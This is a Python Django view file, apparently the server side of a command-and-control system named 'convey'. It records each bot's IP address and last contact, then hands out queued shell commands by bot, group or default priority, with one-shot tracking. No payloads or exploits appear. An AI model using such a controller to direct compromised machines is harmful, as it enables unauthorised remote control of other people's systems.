from django.http import HttpResponse, Http404
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
from django.shortcuts import get_object_or_404
from convey.models import Bot, Command, Bot_Command
from convey.views.utils import get_ip
import json

# Grab a Command object based on a hash_sum or group number
# If no command exists for the query, return None


def query_cmd(bot, query_set, hash_sum=None, group=None):
    cmd_list = None
    if hash_sum:
        cmd_list = query_set.filter(hash_assigned=hash_sum)
    elif group:
        cmd_list = query_set.filter(group_assigned=group)

    if not cmd_list:
        return None

    completed_cmds = bot.completed_cmds.all()

    for cmd in cmd_list:
        if cmd.oneshot and cmd in completed_cmds:
            continue
        else:
            return cmd

    return None


def get_current_cmd(bot, active_cmds):
    # Prioritize individual commands, ALL commands, group commands, and lastly
    # DEFAULT commands
    command = query_cmd(bot, active_cmds, hash_sum=bot.hash_sum)
    if command:
        return command

    command = query_cmd(bot, active_cmds, group=-1)
    if command:
        return command

    command = query_cmd(bot, active_cmds, group=bot.group)
    if command:
        return command

    command = query_cmd(bot, active_cmds, group=-2)
    if command:
        return command

    # If no commands are in the bot's queue, return None
    return None


def command_to_json(command):
    cmd_dict = {
        'shell': command.shell,
        'command_text': command.cmd_txt,
        'files': [],
    }
    for dep in command.file_set.all():
        depfile_dict = {
            'name': dep.name,
            'type': dep.file_type,
            'path': dep.path
        }
        cmd_dict['files'].append(depfile_dict)
    json_str = json.dumps(cmd_dict)

    return json_str


@csrf_exempt
def cmd(request):
    # Alternate clients do not currently send version
    if 'version' in request.POST:
        version = request.POST['version']
    else:
        version = None

    hash_sum = request.POST['hash_sum']

    bot = get_object_or_404(Bot, hash_sum=hash_sum)
    bot.version = version
    bot.ip_addr = get_ip(request)
    bot.last_contact = timezone.now()
    bot.save()

    # Only use commands that are queued to run at this time
    now = timezone.now()
    active_cmds = Command.objects.filter(
        start_time__lte=now,
        end_time__gte=now
    ).order_by('start_time')

    if not active_cmds:
        raise Http404

    # If command selected then continue, else return 404
    command = get_current_cmd(bot, active_cmds)
    if command:
        # Then check if bot already ran command
        # If not, then add command to bot's list of completed commands
        Bot_Command.objects.get_or_create(
            bot=bot,
            cmd=command,
        )

        # Check if client is a legacy client
        if version:
            # Create json with command information
            command_response = command_to_json(command)
        else:
            # Or just return the command text
            command_response = command.cmd_txt

        # Lastly return the command
        return HttpResponse(command_response)
    else:
        raise Http404
